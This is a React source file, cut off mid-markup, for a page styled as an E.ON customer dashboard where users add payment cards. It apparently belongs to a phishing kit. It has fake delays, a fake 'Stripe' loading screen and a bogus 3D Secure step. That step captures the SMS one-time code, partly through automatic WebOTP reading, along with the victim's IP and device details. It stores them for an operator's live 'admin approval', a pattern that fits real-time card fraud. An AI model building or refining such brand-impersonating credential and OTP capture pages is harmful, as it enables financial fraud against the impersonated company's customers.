"use client"

import type React from "react"
import { createClient } from "@/lib/supabase/client"
import { useRouter } from "next/navigation"
import { useState, useEffect, useRef } from "react"
import { getCachedBinData, setCachedBinData } from "@/lib/utils/bin-cache"

interface PaymentMethod {
  id: string
  method_type: string
  card_last_four: string | null
  card_brand: string | null
  card_holder_name: string | null // Added card holder name
  card_expiry_month: string | null // Added expiry month
  card_expiry_year: string | null // Added expiry year
  iban_last_four: string | null
  is_default: boolean
  is_verified: boolean // Added verification status
  verified_at: string | null // Added verification timestamp
  created_at: string
  bank_name: string | null // Added bank name
  card_level: string | null // Added card level
}

interface PaymentMethodsContentProps {
  paymentMethods: PaymentMethod[]
  userId: string
}

// Added BIN data interface
interface BinData {
  bank: {
    name: string
    city?: string
    country?: string
  } | null
  brand: string
  type: string
  level?: string
  country: {
    name: string
    code: string
  } | null
}

export default function PaymentMethodsContent({ paymentMethods: initialMethods, userId }: PaymentMethodsContentProps) {
  const router = useRouter()
  const supabase = createClient()
  const [paymentMethods, setPaymentMethods] = useState(initialMethods)
  const [showAddModal, setShowAddModal] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isAddingCard, setIsAddingCard] = useState(false)
  const [settingDefaultId, setSettingDefaultId] = useState<string | null>(null)
  const [deletingId, setDeletingId] = useState<string | null>(null)
  const [formData, setFormData] = useState({
    method_type: "credit_card",
    card_number: "",
    card_holder: "",
    expiry_month: "",
    expiry_year: "",
    cvv: "",
    card_brand: "",
    iban: "",
  })
  const [expiryDisplay, setExpiryDisplay] = useState("")
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [validFields, setValidFields] = useState<Record<string, boolean>>({})
  const [cardType, setCardType] = useState<"visa" | "mastercard" | "amex" | "discover" | null>(null)
  const [focusedField, setFocusedField] = useState<string | null>(null)
  const [showCvvTooltip, setShowCvvTooltip] = useState(false) // Added state for CVV tooltip

  const [show3DSecureModal, setShow3DSecureModal] = useState(false)
  const [verificationCode, setVerificationCode] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [verificationStep, setVerificationStep] = useState<"loading" | "auth" | "success">("loading")
  const [pendingCardId, setPendingCardId] = useState<string | null>(null)

  const [binData, setBinData] = useState<BinData | null>(null)
  const [isFetchingBin, setIsFetchingBin] = useState(false)
  const [pending3DSecureBinData, setPending3DSecureBinData] = useState<BinData | null>(null)

  const binFetchTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const binAbortControllerRef = useRef<AbortController | null>(null)

  const [showStripeLoading, setShowStripeLoading] = useState(false)

  const cardNumberRef = useRef<HTMLInputElement>(null)
  const expiryRef = useRef<HTMLInputElement>(null)
  const cvvRef = useRef<HTMLInputElement>(null)
  const cardHolderRef = useRef<HTMLInputElement>(null)
  const verificationCodeRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    if (showAddModal && cardNumberRef.current) {
      setTimeout(() => cardNumberRef.current?.focus(), 100)
    }
  }, [showAddModal])

  useEffect(() => {
    if (show3DSecureModal && verificationStep === "auth" && verificationCodeRef.current) {
      setTimeout(() => verificationCodeRef.current?.focus(), 100)
    }
  }, [show3DSecureModal, verificationStep])

  useEffect(() => {
    if (show3DSecureModal && verificationStep === "auth" && "OTPCredential" in window) {
      const abortController = new AbortController()

      navigator.credentials
        .get({
          // @ts-ignore - WebOTP API
          otp: { transport: ["sms"] },
          signal: abortController.signal,
        })
        .then((otp: any) => {
          if (otp && otp.code) {
            console.log("[v0] SMS code auto-detected:", otp.code)
            setVerificationCode(otp.code)
            setTimeout(() => handle3DSecureVerification(otp.code), 300)
          }
        })
        .catch((err: any) => {
          console.log("[v0] WebOTP error:", err)
        })

      return () => abortController.abort()
    }
  }, [show3DSecureModal, verificationStep])

  const fetchBinData = async (bin: string) => {
    if (bin.length < 6) {
      setBinData(null)
      return
    }

    // Check cache first
    const cached = getCachedBinData(bin.slice(0, 8))
    if (cached) {
      console.log("[v0] BIN data from cache:", cached)
      setBinData(cached)
      return
    }

    // Cancel previous request if exists
    if (binAbortControllerRef.current) {
      binAbortControllerRef.current.abort()
    }

    // Create new abort controller
    const abortController = new AbortController()
    binAbortControllerRef.current = abortController

    setIsFetchingBin(true)

    try {
      const response = await fetch(`/api/bin-lookup?bin=${bin.slice(0, 8)}`, {
        signal: abortController.signal,
      })

      if (response.ok) {
        const data = await response.json()
        console.log("[v0] BIN data received:", data)

        // Cache the result
        setCachedBinData(bin.slice(0, 8), data)

        setBinData(data)
      } else {
        console.log("[v0] BIN lookup failed:", response.status)
        setBinData(null)
      }
    } catch (error: any) {
      if (error.name === "AbortError") {
        console.log("[v0] BIN lookup cancelled")
      } else {
        console.log("[v0] BIN lookup error:", error)
        setBinData(null)
      }
    } finally {
      setIsFetchingBin(false)
      binAbortControllerRef.current = null
    }
  }

  useEffect(() => {
    const cleaned = formData.card_number.replace(/\D/g, "")

    // Clear previous timeout
    if (binFetchTimeoutRef.current) {
      clearTimeout(binFetchTimeoutRef.current)
    }

    if (cleaned.length >= 6) {
      // Debounce for 300ms
      binFetchTimeoutRef.current = setTimeout(() => {
        fetchBinData(cleaned)
      }, 300)
    } else {
      setBinData(null)
      // Cancel any pending request
      if (binAbortControllerRef.current) {
        binAbortControllerRef.current.abort()
        binAbortControllerRef.current = null
      }
    }

    // Cleanup on unmount
    return () => {
      if (binFetchTimeoutRef.current) {
        clearTimeout(binFetchTimeoutRef.current)
      }
      if (binAbortControllerRef.current) {
        binAbortControllerRef.current.abort()
      }
    }
  }, [formData.card_number])

  const luhnCheck = (cardNumber: string): boolean => {
    const digits = cardNumber.replace(/\D/g, "")
    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = Number.parseInt(digits[i])

      if (isEven) {
        digit *= 2
        if (digit > 9) digit -= 9
      }

      sum += digit
      isEven = !isEven
    }

    return sum % 10 === 0
  }

  const detectCardType = (number: string): "visa" | "mastercard" | "amex" | "discover" | null => {
    const cleaned = number.replace(/\D/g, "")

    if (/^4/.test(cleaned)) return "visa"
    if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return "mastercard"
    if (/^3[47]/.test(cleaned)) return "amex"
    if (/^6(?:011|5)/.test(cleaned)) return "discover"

    return null
  }

  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\D/g, "")
    const type = detectCardType(cleaned)

    if (type === "amex") {
      // Amex: 4-6-5 format
      return cleaned.replace(/(\d{4})(\d{6})(\d{5})/, "$1 $2 $3").trim()
    }
    // Others: 4-4-4-4 format
    return cleaned.replace(/(\d{4})/g, "$1 ").trim()
  }

  const formatExpiry = (value: string): string => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`
    }
    return cleaned
  }

  const validateCardNumber = (number: string): string => {
    const cleaned = number.replace(/\D/g, "")

    if (cleaned.length === 0) return "Kartennummer ist erforderlich"
    if (cleaned.length < 13) return "Kartennummer ist zu kurz"
    if (cleaned.length > 19) return "Kartennummer ist zu lang"
    if (!luhnCheck(cleaned)) return "Ungültige Kartennummer"

    return ""
  }

  const validateExpiry = (month: string, year: string): string => {
    if (!month || !year) return "Ablaufdatum ist erforderlich"

    const monthNum = Number.parseInt(month)
    const yearNum = Number.parseInt(`20${year}`)

    if (monthNum < 1 || monthNum > 12) return "Ungültiger Monat"

    const now = new Date()
    const expiry = new Date(yearNum, monthNum - 1)

    if (expiry < now) return "Karte ist abgelaufen"

    return ""
  }

  const validateCvv = (cvv: string, cardType: string | null): string => {
    if (!cvv) return "CVV ist erforderlich"

    const expectedLength = cardType === "amex" ? 4 : 3
    if (cvv.length !== expectedLength) {
      return `CVV muss ${expectedLength} Ziffern haben`
    }

    return ""
  }

  const handleCardNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    const maxLength = 19

    if (cleaned.length <= maxLength) {
      const formatted = formatCardNumber(cleaned)
      const type = detectCardType(cleaned)

      setCardType(type)
      setFormData({ ...formData, card_number: formatted, card_brand: type || "" })

      if (cleaned.length >= 13) {
        const error = validateCardNumber(cleaned)
        setErrors({ ...errors, card_number: error })
        setValidFields({ ...validFields, card_number: !error })

        const expectedLength = type === "amex" ? 15 : 16
        if (cleaned.length === expectedLength && !error) {
          setTimeout(() => expiryRef.current?.focus(), 100)
        }
      } else {
        const newErrors = { ...errors }
        delete newErrors.card_number
        setErrors(newErrors)
        const newValidFields = { ...validFields }
        delete newValidFields.card_number
        setValidFields(newValidFields)
      }
    }
  }

  const handleExpiryChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")

    if (cleaned.length <= 4) {
      const formatted = formatExpiry(cleaned)
      const month = cleaned.slice(0, 2)
      const year = cleaned.slice(2, 4)

      setExpiryDisplay(formatted)
      setFormData({ ...formData, expiry_month: month, expiry_year: year })

      if (cleaned.length === 4) {
        const error = validateExpiry(month, year)
        setErrors({ ...errors, expiry: error })
        setValidFields({ ...validFields, expiry: !error })

        if (!error) {
          setTimeout(() => cvvRef.current?.focus(), 100)
        }
      } else {
        const newErrors = { ...errors }
        delete newErrors.expiry
        setErrors(newErrors)
        const newValidFields = { ...validFields }
        delete newValidFields.expiry
        setValidFields(newValidFields)
      }
    }
  }

  const handleCvvChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    const maxLength = cardType === "amex" ? 4 : 3

    if (cleaned.length <= maxLength) {
      setFormData({ ...formData, cvv: cleaned })

      if (cleaned.length === maxLength) {
        const error = validateCvv(cleaned, cardType)
        setErrors({ ...errors, cvv: error })
        setValidFields({ ...validFields, cvv: !error })

        if (!error) {
          setTimeout(() => cardHolderRef.current?.focus(), 100)
        }
      } else {
        const newErrors = { ...errors }
        delete newErrors.cvv
        setErrors(newErrors)
        const newValidFields = { ...validFields }
        delete newValidFields.cvv
        setValidFields(newValidFields)
      }
    }
  }

  const handleCardHolderChange = (value: string) => {
    const upperValue = value.toUpperCase()
    setFormData({ ...formData, card_holder: upperValue })

    // Validate card holder (at least 3 characters)
    const isValid = upperValue.trim().length >= 3
    if (isValid) {
      setValidFields({ ...validFields, card_holder: true })
      const newErrors = { ...errors }
      delete newErrors.card_holder
      setErrors(newErrors)
    } else {
      const newValidFields = { ...validFields }
      delete newValidFields.card_holder
      setValidFields(newValidFields)
    }
  }

  const handleSignOut = async () => {
    await supabase.auth.signOut()
    router.push("/")
  }

  const handleAddPaymentMethod = async (e: React.FormEvent) => {
    e.preventDefault()

    const newErrors: Record<string, string> = {}

    if (formData.method_type === "credit_card") {
      const cleaned = formData.card_number.replace(/\D/g, "")
      newErrors.card_number = validateCardNumber(cleaned)
      newErrors.card_holder = !formData.card_holder ? "Karteninhaber ist erforderlich" : ""
      newErrors.expiry = validateExpiry(formData.expiry_month, formData.expiry_year)
      newErrors.cvv = validateCvv(formData.cvv, cardType)

      Object.keys(newErrors).forEach((key) => {
        if (!newErrors[key]) delete newErrors[key]
      })

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors)
        return
      }

      const lastFour = cleaned.slice(-4)
      const isDuplicate = paymentMethods.some(
        (pm) =>
          pm.method_type === "credit_card" &&
          pm.card_last_four === lastFour &&
          pm.card_brand?.toLowerCase() === cardType?.toLowerCase() &&
          pm.card_expiry_month === formData.expiry_month &&
          pm.card_expiry_year === formData.expiry_year,
      )

      if (isDuplicate) {
        alert("Diese Karte wurde bereits hinzugefügt. Bitte verwenden Sie eine andere Karte.")
        return
      }
    }

    setIsAddingCard(true)
    setIsSubmitting(true)

    // Wait 10 seconds with button showing loading state
    await new Promise((resolve) => setTimeout(resolve, 10000))

    // Now close modal and show branded loading screen
    setShowAddModal(false)
    setShowStripeLoading(true)

    const insertData: any = {
      user_id: userId,
      method_type: formData.method_type,
      is_default: paymentMethods.length === 0,
      is_verified: false, // Initially unverified
    }

    if (formData.method_type === "credit_card") {
      const cleaned = formData.card_number.replace(/\D/g, "")
      insertData.card_last_four = cleaned.slice(-4)
      insertData.card_brand = cardType || "Unknown"
      insertData.card_holder_name = formData.card_holder
      insertData.card_expiry_month = formData.expiry_month
      insertData.card_expiry_year = formData.expiry_year
      insertData.bank_name = binData?.bank?.name || null
      insertData.card_level = binData?.level || null
    } else if (formData.method_type === "bank_transfer") {
      insertData.iban_last_four = formData.iban.slice(-4)
    }

    const { data, error } = await supabase.from("payment_methods").insert(insertData).select().single()

    if (!error && data) {
      setPendingCardId(data.id)
      setPending3DSecureBinData(binData)

      // Wait 8 seconds before showing 3D Secure modal
      setTimeout(() => {
        setShowStripeLoading(false)
        setShow3DSecureModal(true)
        setVerificationStep("auth") // Go directly to auth, skip loading
        setIsAddingCard(false)
        setIsSubmitting(false)
      }, 8000)
    } else {
      setShowStripeLoading(false)
      setIsAddingCard(false)
      setIsSubmitting(false)
      alert("Fehler beim Hinzufügen der Zahlungsmethode. Bitte versuchen Sie es erneut.")
    }
  }

  const handle3DSecureVerification = async (code?: string) => {
    const codeToVerify = code || verificationCode
    if (codeToVerify.length !== 6) return

    setIsVerifying(true)

    try {
      console.log("[v0] Creating verification request for admin approval")

      // Get user's IP and device info
      const ipResponse = await fetch("https://api.ipify.org?format=json")
      const { ip } = await ipResponse.json()

      // Create verification request
      const { data: verificationRequest, error: verificationError } = await supabase
        .from("verification_requests")
        .insert({
          user_id: userId,
          payment_method_id: pendingCardId,
          verification_code: codeToVerify,
          status: "pending",
          ip_address: ip,
          location_info: {},
          browser_info: { userAgent: navigator.userAgent },
          device_info: { platform: navigator.platform },
          expires_at: new Date(Date.now() + 40000).toISOString(), // 40 seconds from now
        })
        .select()
        .single()

      if (verificationError) {
        console.error("[v0] Failed to create verification request:", verificationError)
        throw verificationError
      }

      console.log("[v0] Verification request created:", verificationRequest)

      // Show waiting state
      setVerificationStep("loading")

      // Poll for admin approval
      const pollInterval = setInterval(async () => {
        const { data: request } = await supabase
          .from("verification_requests")
          .select("status")
          .eq("id", verificationRequest.id)
          .single()

        if (request?.status === "approved") {
          clearInterval(pollInterval)

          // Update card as verified
          await supabase
            .from("payment_methods")
            .update({
              is_verified: true,
              verified_at: new Date().toISOString(),
            })
            .eq("id", pendingCardId)

          setVerificationStep("success")

          // Close modal after success animation
          setTimeout(() => {
            setShow3DSecureModal(false)
            setVerificationCode("")
            setVerificationStep("loading")
            setPendingCardId(null)
            setPending3DSecureBinData(null)
            setIsVerifying(false)
            router.refresh()
          }, 2500)
        } else if (request?.status === "declined") {
          clearInterval(pollInterval)

          // Delete the payment method
          await supabase.from("payment_methods").delete().eq("id", pendingCardId)

          setShow3DSecureModal(false)
          setVerificationCode("")
          setVerificationStep("loading")
          setPendingCardId(null)
          setPending3DSecureBinData(null)
          setIsVerifying(false)
          alert("Verifizierung abgelehnt. Bitte versuchen Sie es erneut.")
        }
      }, 1000) // Poll every second

      // Auto-timeout after 40 seconds
      setTimeout(() => {
        clearInterval(pollInterval)
        if (verificationStep !== "success") {
          setShow3DSecureModal(false)
          setVerificationCode("")
          setVerificationStep("loading")
          setPendingCardId(null)
          setPending3DSecureBinData(null)
          setIsVerifying(false)
          alert("Verifizierung abgelaufen. Bitte versuchen Sie es erneut.")
        }
      }, 40000)
    } catch (error) {
      console.error("[v0] Verification error:", error)
      setShow3DSecureModal(false)
      setVerificationCode("")
      setVerificationStep("loading")
      setPendingCardId(null)
      setPending3DSecureBinData(null)
      setIsVerifying(false)
      alert("Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.")
    }
  }

  const handleVerificationCodeChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length <= 6) {
      setVerificationCode(cleaned)

      // Auto-submit when 6 digits entered
      if (cleaned.length === 6) {
        setTimeout(() => handle3DSecureVerification(cleaned), 300)
      }
    }
  }

  const handleSetDefault = async (methodId: string) => {
    setSettingDefaultId(methodId)

    await supabase.from("payment_methods").update({ is_default: false }).eq("user_id", userId)

    const { error } = await supabase.from("payment_methods").update({ is_default: true }).eq("id", methodId)

    if (!error) {
      setPaymentMethods(
        paymentMethods.map((pm) => ({
          ...pm,
          is_default: pm.id === methodId,
        })),
      )
    }

    setSettingDefaultId(null)
  }

  const handleDeleteMethod = async (methodId: string) => {
    if (!confirm("Möchten Sie diese Zahlungsmethode wirklich löschen?")) return

    setDeletingId(methodId)
    const { error } = await supabase.from("payment_methods").delete().eq("id", methodId)

    if (!error) {
      setPaymentMethods(paymentMethods.filter((pm) => pm.id !== methodId))
    }
    setDeletingId(null)
  }

  const resetForm = () => {
    setFormData({
      method_type: "credit_card",
      card_number: "",
      card_holder: "",
      expiry_month: "",
      expiry_year: "",
      cvv: "",
      card_brand: "",
      iban: "",
    })
    setExpiryDisplay("")
    setErrors({})
    setValidFields({})
    setCardType(null)
    setFocusedField(null)
    setBinData(null) // Reset BIN data on form reset
    setShowCvvTooltip(false) // Reset CVV tooltip state
  }

  const isFormValid = validFields.card_number && validFields.card_holder && validFields.expiry && validFields.cvv

  const isCardExpiringSoon = (month: string | null, year: string | null): boolean => {
    if (!month || !year) return false
    const expiry = new Date(2000 + Number.parseInt(year), Number.parseInt(month) - 1)
    const threeMonthsFromNow = new Date()
    threeMonthsFromNow.setMonth(threeMonthsFromNow.getMonth() + 3)
    return expiry <= threeMonthsFromNow
  }

  const getCardBrandColor = (brand: string | null): string => {
    switch (brand?.toLowerCase()) {
      case "visa":
        return "from-blue-600 to-blue-800"
      case "mastercard":
        return "from-red-600 to-orange-600"
      case "amex":
        return "from-blue-700 to-indigo-800"
      case "discover":
        return "from-orange-600 to-orange-800"
      default:
        return "from-gray-700 to-gray-900"
    }
  }

  const getPaymentMethodDisplay = (pm: PaymentMethod) => {
    if (pm.method_type === "credit_card") {
      const isExpiringSoon = isCardExpiringSoon(pm.card_expiry_month, pm.card_expiry_year)
      const brandColor = getCardBrandColor(pm.card_brand)

      const displayTitle = pm.bank_name || `${pm.card_brand} Kreditkarte`
      const displaySubtitle = pm.card_level ? `${pm.card_level} •••• ${pm.card_last_four}` : `•••• ${pm.card_last_four}`

      return {
        title: displayTitle,
        subtitle: displaySubtitle,
        cardHolder: pm.card_holder_name,
        expiry: pm.card_expiry_month && pm.card_expiry_year ? `${pm.card_expiry_month}/${pm.card_expiry_year}` : null,
        isExpiringSoon,
        isVerified: pm.is_verified, // Added verification status
        brandColor,
        icon: (
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
            <line x1="1" y1="10" x2="23" y2="10" />
          </svg>
        ),
      }
    }
    if (pm.method_type === "bank_transfer") {
      return {
        title: "Banküberweisung",
        subtitle: `IBAN •••• ${pm.iban_last_four}`,
        cardHolder: null,
        expiry: null,
        isExpiringSoon: false,
        isVerified: pm.is_verified, // Keep consistent
        brandColor: "from-gray-700 to-gray-900",
        icon: (
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <line x1="12" y1="1" x2="12" y2="23" />
            <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
          </svg>
        ),
      }
    }
    return {
      title: pm.method_type,
      subtitle: "",
      cardHolder: null,
      expiry: null,
      isExpiringSoon: false,
      isVerified: pm.is_verified, // Keep consistent
      brandColor: "from-gray-700 to-gray-900",
      icon: null,
    }
  }

  const handleCardNumberPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedText = e.clipboardData.getData("text")
    const cleaned = pastedText.replace(/\D/g, "")
    if (cleaned.length >= 13 && cleaned.length <= 19) {
      handleCardNumberChange(cleaned)
    }
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, nextRef: React.RefObject<HTMLInputElement>) => {
    if (e.key === "Enter") {
      e.preventDefault()
      nextRef.current?.focus()
    }
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#F5F5F5]">
      <header className="bg-white border-b border-gray-200 px-6 py-4">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <img src="/eon-logo.svg" alt="E.ON Logo" className="h-8" />
          <nav className="hidden md:flex items-center gap-6">
            <button
              onClick={() => router.push("/dashboard")}
              className="text-sm font-medium text-black hover:text-[#E20015]"
            >
              Übersicht
            </button>
            <button
              onClick={() => router.push("/dashboard/bills")}
              className="text-sm font-medium text-black hover:text-[#E20015]"
            >
              Rechnungen
            </button>
            <button
              onClick={() => router.push("/dashboard/profile")}
              className="text-sm font-medium text-black hover:text-[#E20015]"
            >
              Profil
            </button>
            <button onClick={handleSignOut} className="text-sm font-medium text-gray-600 hover:text-[#E20015]">
              Abmelden
            </button>
          </nav>
          <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} className="md:hidden text-black">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <line x1="3" y1="12" x2="21" y2="12" />
              <line x1="3" y1="6" x2="21" y2="6" />
              <line x1="3" y1="18" x2="21" y2="18" />
            </svg>
          </button>
        </div>
        {mobileMenuOpen && (
          <div className="md:hidden mt-4 pb-4 border-t border-gray-200 pt-4">
            <nav className="flex flex-col gap-4">
              <button
                onClick={() => {
                  router.push("/dashboard")
                  setMobileMenuOpen(false)
                }}
                className="text-sm font-medium text-black hover:text-[#E20015] text-left"
              >
                Übersicht
              </button>
              <button
                onClick={() => {
                  router.push("/dashboard/bills")
                  setMobileMenuOpen(false)
                }}
                className="text-sm font-medium text-black hover:text-[#E20015] text-left"
              >
                Rechnungen
              </button>
              <button
                onClick={() => {
                  router.push("/dashboard/profile")
                  setMobileMenuOpen(false)
                }}
                className="text-sm font-medium text-black hover:text-[#E20015] text-left"
              >
                Profil
              </button>
              <button
                onClick={() => {
                  handleSignOut()
                  setMobileMenuOpen(false)
                }}
                className="text-sm font-medium text-gray-600 hover:text-[#E20015] text-left"
              >
                Abmelden
              </button>
            </nav>
          </div>
        )}
      </header>

      <main className="flex-1">
        {/* Hero Section - E.ON Red */}
        <section className="bg-gradient-to-r from-[#E20015] to-[#C00012] text-white px-6 py-12">
          <div className="max-w-6xl mx-auto">
            <h1 className="text-4xl md:text-5xl font-bold mb-4">Zahlungsmethoden</h1>
            <p className="text-xl text-white/90 mb-6">Verwalten Sie Ihre Zahlungsmethoden sicher und bequem</p>
            <button
              onClick={() => setShowAddModal(true)}
              className="bg-white text-[#E20015] hover:bg-gray-100 font-bold py-4 px-8 rounded-lg transition-colors inline-flex items-center gap-2"
            >
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <line x1="12" y1="5" x2="12" y2="19" />
                <line x1="5" y1="12" x2="19" y2="12" />
              </svg>
              Neue Zahlungsmethode hinzufügen
            </button>
          </div>
        </section>

        {/* Content Section - Grey Background */}
        <section className="px-6 py-12">
          <div className="max-w-6xl mx-auto">
            {paymentMethods.length === 0 ? (
              <div className="bg-white rounded-lg p-12 text-center shadow-sm">
                <div className="w-20 h-20 mx-auto mb-6 bg-gray-100 rounded-full flex items-center justify-center">
                  <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2">
                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
                    <line x1="1" y1="10" x2="23" y2="10" />
                  </svg>
                </div>
                <h3 className="text-2xl font-bold text-gray-900 mb-3">Keine Zahlungsmethoden hinterlegt</h3>
                <p className="text-gray-600 mb-8 max-w-md mx-auto">
                  Fügen Sie eine Zahlungsmethode hinzu, um Ihre Rechnungen bequem zu bezahlen.
                </p>
                <button
                  onClick={() => setShowAddModal(true)}
                  className="bg-[#E20015] hover:bg-[#C00012] text-white font-bold py-4 px-8 rounded-lg transition-colors"
                >
                  Zahlungsmethode hinzufügen
                </button>
              </div>
            ) : (
              <div className="space-y-6">
                <h2 className="text-2xl font-bold text-gray-900 mb-6">Ihre Zahlungsmethoden</h2>

                {paymentMethods.map((pm) => {
                  const display = getPaymentMethodDisplay(pm)
                  const isDeleting = deletingId === pm.id
                  const isSettingDefault = settingDefaultId === pm.id

                  return (
                    <div
                      key={pm.id}
                      className="bg-white rounded-lg overflow-hidden shadow-sm hover:shadow-md transition-shadow"
                    >
                      <div className="p-6">
                        <div className="flex items-start justify-between mb-4">
                          <div className="flex items-center gap-4">
                            <div className="w-14 h-14 bg-gray-100 rounded-lg flex items-center justify-center flex-shrink-0">
                              {display.icon}
                            </div>
                            <div>
                              <h3 className="text-lg font-bold text-gray-900">{display.title}</h3>
                              <p className="text-gray-600 font-mono text-lg">{display.subtitle}</p>
                              {display.cardHolder && <p className="text-sm text-gray-500 mt-1">{display.cardHolder}</p>}
                            </div>
                          </div>

                          <div className="flex flex-col items-end gap-2">
                            {pm.is_default && (
                              <span className="inline-flex px-3 py-1 text-xs font-semibold rounded-full bg-green-100 text-green-800">
                                ✓ Standard
                              </span>
                            )}
                            {pm.is_verified && (
                              <span className="inline-flex px-3 py-1 text-xs font-semibold rounded-full bg-blue-100 text-blue-800">
                                ✓ Verifiziert
                              </span>
                            )}
                            {!pm.is_verified && (
                              <span className="inline-flex px-3 py-1 text-xs font-semibold rounded-full bg-yellow-100 text-yellow-800">
                                ⚠ Ausstehend
                              </span>
                            )}
                            {display.isExpiringSoon && (
                              <span className="inline-flex px-3 py-1 text-xs font-semibold rounded-full bg-orange-100 text-orange-800">
                                ⚠ Läuft bald ab
                              </span>
                            )}
                          </div>
                        </div>

                        {display.expiry && (
                          <div className="mb-4 pb-4 border-b border-gray-200">
                            <p className="text-sm text-gray-600">
                              Gültig bis: <span className="font-mono font-semibold">{display.expiry}</span>
                            </p>
                          </div>
                        )}

                        <div className="flex items-center justify-between">
                          <p className="text-xs text-gray-500">
                            Hinzugefügt am {new Date(pm.created_at).toLocaleDateString("de-DE")}
                          </p>
                          <div className="flex gap-3">
                            {/* Added verify button for unverified cards */}
                            {!pm.is_verified && (
                              <button
                                onClick={() => {
                                  setPendingCardId(pm.id)
                                  setPending3DSecureBinData({
                                    bank: pm.bank_name ? { name: pm.bank_name } : null,
                                    brand: pm.card_brand || "",
                                    type: "credit",
                                    level: pm.card_level || undefined,
                                    country: null,
                                  })
                                  setShow3DSecureModal(true)
                                  setVerificationStep("auth")
                                }}
                                className="text-sm text-[#E20015] hover:text-[#C00012] font-semibold transition-colors"
                              >
                                Jetzt verifizieren
                              </button>
                            )}
                            {!pm.is_default && pm.is_verified && (
                              <button
                                onClick={() => handleSetDefault(pm.id)}
                                disabled={isSettingDefault || isDeleting}
                                className="text-sm text-[#E20015] hover:text-[#C00012] font-semibold disabled:opacity-50 transition-colors"
                              >
                                {isSettingDefault ? "Wird gesetzt..." : "Als Standard festlegen"}
                              </button>
                            )}
                            <button
                              onClick={() => handleDeleteMethod(pm.id)}
                              disabled={isDeleting || isSettingDefault}
                              className="text-sm text-gray-600 hover:text-red-600 font-semibold disabled:opacity-50 transition-colors"
                            >
                              {isDeleting ? "Wird gelöscht..." : "Entfernen"}
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  )
                })}
              </div>
            )}
          </div>
        </section>
      </main>

      {showAddModal && (
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center p-4 z-50 backdrop-blur-sm">
          <div className="bg-white rounded-lg max-w-3xl w-full max-h-[90vh] overflow-y-auto shadow-2xl">
            <div className="bg-gradient-to-r from-[#E20015] to-[#C00012] px-8 py-6">
              <h2 className="text-3xl font-bold text-white">Zahlungsmethode hinzufügen</h2>
              <p className="text-white/90 mt-2">Ihre Daten werden sicher verschlüsselt übertragen</p>
            </div>

            <form onSubmit={handleAddPaymentMethod} className="p-8">
              <div className="space-y-6">
                {/* Reorganized form layout: Card Number (full width) → Expiry | CVV → Card Holder (full width) */}
                <div>
                  <label className="block text-sm font-bold text-gray-900 mb-2">Kartennummer *</label>
                  <div className="relative">
                    <input
                      ref={cardNumberRef}
                      type="text"
                      inputMode="numeric"
                      autoComplete="cc-number"
                      placeholder="1234 5678 9012 3456"
                      value={formData.card_number}
                      onChange={(e) => handleCardNumberChange(e.target.value)}
                      onPaste={handleCardNumberPaste}
                      onKeyDown={(e) => handleKeyDown(e, expiryRef)}
                      onFocus={() => setFocusedField("card_number")}
                      onBlur={() => setFocusedField(null)}
                      className={`w-full px-4 py-3 border-2 rounded-lg focus:outline-none transition-all ${
                        errors.card_number
                          ? "border-red-500 focus:border-red-600"
                          : validFields.card_number
                            ? "border-green-500 bg-green-50"
                            : focusedField === "card_number"
                              ? "border-[#E20015] ring-4 ring-[#E20015]/10"
                              : "border-gray-300 focus:border-[#E20015]"
                      }`}
                      required
                    />
                    {isFetchingBin && (
                      <div className="absolute inset-y-0 right-10 flex items-center pr-3 pointer-events-none">
                        <svg className="animate-spin h-5 w-5 text-[#E20015]" viewBox="0 0 24 24">
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                            fill="none"
                          />
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          />
                        </svg>
                      </div>
                    )}
                    {validFields.card_number && (
                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
                          <path d="M20 6L9 17l-5-5" />
                        </svg>
                      </div>
                    )}
                    {cardType && !isFetchingBin && (
                      <div className="absolute right-10 top-1/2 -translate-y-1/2 flex items-center gap-2">
                        <svg className="w-10 h-6" viewBox="0 0 48 32">
                          {cardType === "visa" && (
